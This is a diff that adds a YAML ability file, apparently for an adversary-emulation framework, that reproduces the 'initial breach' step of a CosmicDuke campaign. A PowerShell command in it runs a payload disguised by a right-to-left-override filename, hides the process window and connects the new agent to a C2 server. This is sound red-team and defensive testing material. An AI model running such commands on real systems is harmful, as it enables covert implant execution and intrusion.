@@ -1,0 +1,54 @@
+# Step 1 - Initial Breach
+
+- id: 571845f6-b75c-4b9d-a666-a78f7827261f
+  name: RTLO Start Sandcat
+  description: Perform RTLO technique with SANDCAT
+  tactic: execution
+  technique:
+    attack_id: T1036.002
+    name: "Masquerading: Right-to-Left Override"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163405/CosmicDuke.pdf"
+  procedure_group: procedure_execution
+  procedure_step: "1.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Sleep 3;
+          $bin = Get-ChildItem *cod*scr*;
+          $arguments = '-server "#{server}" -group "rtlo_group"';
+          start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;
+
+          if ($?) {
+            write-host "Successfully completed RTLO execution. A new agent should appear";
+            exit 0;
+
+          } else {
+            write-host "Failure of RTLO execution.";
+            exit 1;
+          }
+        payloads:
+        - cod.3aka3.scr
+
+  input_arguments:
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      Sleep 3;
+      $bin = Get-ChildItem *cod*scr*;
+      $arguments = '-server "#{server}" -group "rtlo_group"';
+      start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;
+
+      if ($?) {
+        write-host "Successfully completed RTLO execution. A new agent should appear";
+        exit 0;
+
+      } else {
+        write-host "Failure of RTLO execution.";
+        exit 1;
+      }
